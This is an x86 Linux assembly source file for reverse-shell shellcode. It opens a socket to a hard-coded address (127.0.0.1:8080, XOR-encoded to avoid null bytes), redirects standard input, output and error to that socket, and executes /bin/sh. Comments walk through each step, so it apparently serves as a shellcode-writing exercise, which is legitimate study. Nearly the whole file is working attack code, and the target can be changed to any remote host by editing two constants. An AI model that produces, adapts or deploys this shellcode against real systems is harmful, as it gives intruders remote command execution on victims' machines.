; compile : nasm -f elf32 reverser_shellcode_no_segfault.asm && ld -m elf_i386 reverser_shellcode_no_segfault.o -o reverseshell
global      _start

section .text

    IP_ADDRESS  equ     0xfeffff80
    PORT        equ     0x901F
    AF_INET     equ     0x2
    SOCK_STREAM equ     0x1

    SOCKET      equ     0x167
    CONNECT     equ     0x16a
    DUP         equ     0x3f
    EXECVE      equ     0xb
    EXIT        equ     0x1


_start:
; We first need to create a socket
; In C it would be like int host_sock = socket(AF_INET, SOCK_STREAM, protocol);
    mov         ax, SOCKET      ; socketcall (102)
    mov         bl, AF_INET     ;
    mov         cl, SOCK_STREAM
    mov         dl, 0x6
    int         80h             ; execute

; Then connect to ip and port
    xchg        edi, eax
    xor         ecx, ecx
    mov         ecx, IP_ADDRESS ; ip_address = 127.0.0.1 = 7F000001: need to put it in reverse : 0100007f xored with ffffffff : feffff80
    xor         ecx, 0xffffffff ; xoring ip address twice to avoid storing nullbyte
    push        ecx
    push        word PORT       ; port = 8080 = 1F90; need to put it in reverse
    push        word AF_INET    ; AF_INET (2)
    mov         ecx, esp
    push        byte 0x10
    pop         edx

    mov         ebx, edi
    mov         ax, CONNECT
    int         80h             ; execute
    inc         eax
    cmp         eax, 1
    jne         fail
    jmp         continue

fail:
    xor         ebx, ebx
    xor         eax, eax
    mov         al, EXIT
    int         80h

continue:
; Get input and redirect output
    push        byte 0x3
    pop         ecx
    mov         ebx, edi

loop:
    mov         al, 0x3f
    int         80h
    dec         ecx
    jns         loop

; Execute a shell
    xor         ebx, ebx
    xor         ecx, ecx
    xor         edx, edx
    push        ebx
    push        0x68732f2f
    push        0x6e69622f
    mov         ebx, esp

    mov         al, EXECVE
    int         80h
